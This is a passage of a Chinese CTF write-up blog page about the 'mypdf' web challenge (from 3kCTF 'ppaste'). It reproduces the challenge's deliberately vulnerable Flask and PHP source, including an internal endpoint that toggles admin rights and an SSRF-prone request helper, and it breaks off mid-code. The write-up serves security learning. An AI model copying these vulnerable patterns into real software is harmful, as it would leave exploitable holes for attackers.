@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="Hehanzzz">
+
+
+  <meta name="subtitle" content="“冬将尽，春可期”">
+
+
+  <meta name="description" content="Hehanzzz">
+
+
+
+<title>从省赛某题到3KCTF探讨“TCPDF” | Hehanzzz’s Blog</title>
+
+
+
+<link rel="icon" href="/favicon.ico">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#de7441",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#de7441",
+      "border-left-color": "#de7441",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      isDark = !isDark;
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
+  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="Hehanzzz’s Blog" />
+          Hehanzzz’s Blog
+        </h2>
+      </a>
+      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
+        从省赛某题到3KCTF探讨“TCPDF”
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+          <a class="hidden sm:flex" href="/archives">Posts</a>
+        
+        
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
+            </a>
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Twitter" target="_blank" rel="noopener" href="https://x.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:twitter-line"></iconify-icon>
+            </a>
+          
+        
+        <a class="w-5 h-5 hidden sm:flex" title="友情链接" href="2023/12/31/About-me-关于我/">
+          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
+        </a>
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
+        </span>
+        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
+          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
+  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
+        </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="pt-14">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+
+
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+
+  <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+
+
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
+        从省赛某题到3KCTF探讨“TCPDF”
+      </h1>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
+            <time>2024-05-13</time>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
+            <span>23 min</span>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
+            <span>4.5k words</span>
+          </span>
+          
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
+    <p>2024年广东省大学生网络安全竞赛Web-mypdf记录</p>
+<span id="more"></span>
+
+<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>前几天打了一场广东省大学生网络安全竞赛，只能说这比赛十分垃j，这里不细说。但是其中有一题名为“mypdf”是从3KCTF中扒下来的题目，质量很好，值得审计记录，故有此文。</p>
+<p>原题：3kCTF-2021 ppaste</p>
+<h1 id="0x02-基本思路"><a href="#0x02-基本思路" class="headerlink" title="0x02 基本思路"></a>0x02 基本思路</h1><p>拿到这道题的时候，一开始直接放弃了，因为太困了加上队友很给力，完全躺平等着带飞就好了，但是后来发现赛方不上新题加上肯定有很多人py，之前做完的题都被做烂了，于是收到队友的消息发现是原题且带详细解析，直接跑下床做题</p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130149912.png">​</p>
+<p>刚上手这题，扫到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130149173.png">​</p>
+<p>审计发现有点没搞懂路由，因为他给的是这样的附件</p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130149858.png">​</p>
+<p>结合了一下扫出的东西，发现根目录是设置为 html</p>
+<p>然后在前一个目录下用 python 起了一个 8082 端口的服务</p>
+<p>一开始注册的时候想着直接用 invites.txt 里面的注册码行不行，很明显不行</p>
+<p>然后只能仔细分析咯</p>
+<h3 id="python服务"><a href="#python服务" class="headerlink" title="python服务"></a>python服务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qDB</span>(<span class="params">query,qtype=<span class="string">&#x27;fetchAll&#x27;</span>,username=<span class="string">&#x27;&#x27;</span></span>):	<span class="comment">#读取数据库的，被/users路由引用</span></span><br><span class="line">    <span class="keyword">with</span> closing(sqlite3.connect(<span class="string">&quot;/var/www/db/mypdf.db&quot;</span>)) <span class="keyword">as</span> connection:</span><br><span class="line">        <span class="keyword">with</span> closing(connection.cursor()) <span class="keyword">as</span> cursor:</span><br><span class="line">            <span class="keyword">if</span>(qtype==<span class="string">&#x27;fetchAll&#x27;</span>):</span><br><span class="line">                rows = cursor.execute(query).fetchall()</span><br><span class="line">                <span class="keyword">return</span> rows</span><br><span class="line">            <span class="keyword">elif</span>(qtype==<span class="string">&#x27;setAdmin&#x27;</span> <span class="keyword">and</span> username!=<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">                cursor.execute(</span><br><span class="line">					    query,</span><br><span class="line">					    (username,)</span><br><span class="line">					)</span><br><span class="line">               	connection.commit()</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/invites&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)	</span><span class="comment">#注册路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invites</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        myJson = json.loads(request.data)</span><br><span class="line">        <span class="keyword">if</span>(myJson[<span class="string">&#x27;invite&#x27;</span>] <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;/var/www/invites.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)):	<span class="comment">#相当于判断你的邀请码对不对</span></span><br><span class="line">            <span class="keyword">return</span> json.dumps(<span class="literal">True</span>)	<span class="comment">#成功返回True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(<span class="built_in">open</span>(<span class="string">&#x27;/var/www/invites.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)	</span><span class="comment">#后续用于提升user权限为admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        myJson = json.loads(request.data)</span><br><span class="line">        <span class="keyword">if</span>(myJson[<span class="string">&#x27;user&#x27;</span>]):	<span class="comment">#存在user元素就继续走下去</span></span><br><span class="line">        	qDB(<span class="string">&quot;UPDATE users SET priv=not(priv) WHERE user=? &quot;</span>,<span class="string">&quot;setAdmin&quot;</span>,myJson[<span class="string">&#x27;user&#x27;</span>])	<span class="comment">#提升权限</span></span><br><span class="line">        	<span class="keyword">return</span> json.dumps(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="keyword">return</span> json.dumps(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(qDB(<span class="string">&quot;SELECT user,priv FROM users&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;internal console&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">8082</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接在上面注释，方便边阅读代码边理解了</p>
+<h3 id="common-php"><a href="#common-php" class="headerlink" title="common.php"></a>common.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;../db/mypdf.db&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ci</span>(<span class="params"><span class="variable">$i</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title class_">SQLite3</span>::<span class="title function_ invoke__">escapeString</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlArray</span>(<span class="params"><span class="variable">$q</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$q</span>);</span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC)) &#123;</span><br><span class="line">		<span class="variable">$a</span>[]=<span class="variable">$row</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uExists</span>(<span class="params"><span class="variable">$u</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (@<span class="title function_ invoke__">count</span>(@<span class="title function_ invoke__">sqlArray</span>(<span class="string">&quot;SELECT * FROM users WHERE user=&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$u</span>).<span class="string">&quot;&#x27;&quot;</span>)[<span class="number">0</span>])&gt;<span class="number">0</span>)?True:False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">puts</span>(<span class="params"><span class="variable">$status</span>,<span class="variable">$data</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">							<span class="string">&quot;STATUS&quot;</span>=&gt;(<span class="variable">$status</span>===<span class="number">1</span>?<span class="string">&quot;success&quot;</span>:<span class="string">&quot;error&quot;</span>),</span><br><span class="line">							<span class="string">&quot;DATA&quot;</span>=&gt;(<span class="variable">$data</span>!==<span class="literal">NULL</span>?<span class="variable">$data</span>:<span class="literal">NULL</span>)</span><br><span class="line">						  )</span><br><span class="line">					);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qInternal</span>(<span class="params"><span class="variable">$endpoint</span>,<span class="variable">$payload</span>=<span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$url</span> = <span class="string">&#x27;http://localhost:8082/&#x27;</span>.<span class="variable">$endpoint</span>;</span><br><span class="line">	<span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$payload</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$payload</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">	<span class="keyword">return</span>(@<span class="variable">$result</span>?<span class="variable">$result</span>:<span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whoami</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> @<span class="title function_ invoke__">sqlArray</span>(<span class="string">&quot;SELECT * FROM users WHERE user=&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27; limit 0,1&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myPastes</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> @<span class="title function_ invoke__">sqlArray</span>(<span class="string">&quot;SELECT id,title,content FROM pastes WHERE user=&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一目了然 qInternal 类可控 url 存在 ssrf ，其他类没啥用，不做分析</p>
+<p>且 qInternal 类中指定了 8082 端口，一看就是要利用这个ssrf进行访问内网 8082 端口，打内网服务的</p>
+<h3 id="api-php"><a href="#api-php" class="headerlink" title="api.php"></a>api.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>]!==<span class="string">&quot;POST&quot;</span> OR @<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>]!==<span class="string">&quot;application/json&quot;</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$uInput</span>=@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$uInput</span>)&gt;<span class="number">512</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$uInput</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>)&lt;<span class="number">4</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (@<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">if</span>(!@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;invite&#x27;</span>]) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="variable">$checkInvite</span> = @<span class="title function_ invoke__">json_decode</span>(@<span class="title function_ invoke__">qInternal</span>(<span class="string">&quot;invites&quot;</span>,<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;invite&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;invite&#x27;</span>]))),<span class="literal">true</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$checkInvite</span>===<span class="literal">FALSE</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">uExists</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>])) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;INSERT INTO users(user,pass,priv) VALUES (&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27; ,&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>]).<span class="string">&quot;&#x27; , &#x27;0&#x27;)&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">lastInsertRowID</span>())&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">1</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable">$tU</span>=@<span class="title function_ invoke__">sqlArray</span>(<span class="string">&quot;SELECT * FROM users WHERE 